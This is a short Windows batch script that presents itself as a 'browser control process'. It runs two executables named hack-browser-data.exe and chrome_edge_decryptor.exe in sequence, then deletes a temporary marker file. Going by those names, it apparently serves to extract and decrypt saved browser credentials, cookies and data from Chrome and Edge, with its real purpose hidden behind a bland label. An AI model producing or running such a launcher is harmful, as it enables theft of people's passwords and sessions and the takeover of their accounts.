@echo off
setlocal EnableDelayedExpansion
cd "%~dp0"

echo Starting browser control process...
echo Running from directory: %CD%


echo Running applications sequentially...

REM Run each exe immediately after the previous one finishes

"%CD%\hack-browser-data.exe"
timeout /t 1 /nobreak

"%CD%\chrome_edge_decryptor.exe"
timeout /t 1 /nobreak



REM Quick final wait
timeout /t 1 /nobreak


REM Signal completion
del /F /Q "%CD%\running.tmp"
echo Process completed.
